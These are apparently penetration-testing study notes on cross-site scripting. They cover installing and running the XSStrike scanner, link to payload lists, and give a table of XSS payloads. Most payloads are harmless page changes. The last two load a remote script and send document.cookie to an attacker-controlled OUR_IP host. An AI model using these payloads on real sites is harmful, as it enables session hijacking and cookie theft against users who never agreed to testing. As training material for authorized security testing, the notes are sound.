
## Install XSS Strike

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
```


## Automated XSS Discovery

- `XSS Strike` is used to automated XSS discovery.
- parameter is mandatory to mention.
	
```bash
python3 xsstrike.py -u "<URL>:<PORT>/<full directory_path and parameter>"
```


## Manual Discovery

Manual Discovery requires programming knowledge and code reviews and remember the developers might themselves use automated tools to find these vulnerabilities and fix them so manual code review is required.

### XSS Payloads

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

https://github.com/payloadbox/xss-payload-list

Below are some demos....

|Code|Description|
|---|---|
|**XSS Payloads**||
|`<script>alert(window.origin)</script>`|Basic XSS Payload|
|`<plaintext>`|Basic XSS Payload|
|`<script>print()</script>`|Basic XSS Payload|
|`<img src="" onerror=alert(window.origin)>`|HTML-based XSS Payload|
|`<script>document.body.style.background = "#141d2b"</script>`|Change Background Color|
|`<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`|Change Background Image|
|`<script>document.title = 'HackTheBox Academy'</script>`|Change Website Title|
|`<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`|Overwrite website's main body|
|`<script>document.getElementById('urlform').remove();</script>`|Remove certain HTML element|
|`<script src="http://OUR_IP/script.js"></script>`|Load remote script|
|`<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`|Send Cookie details to us|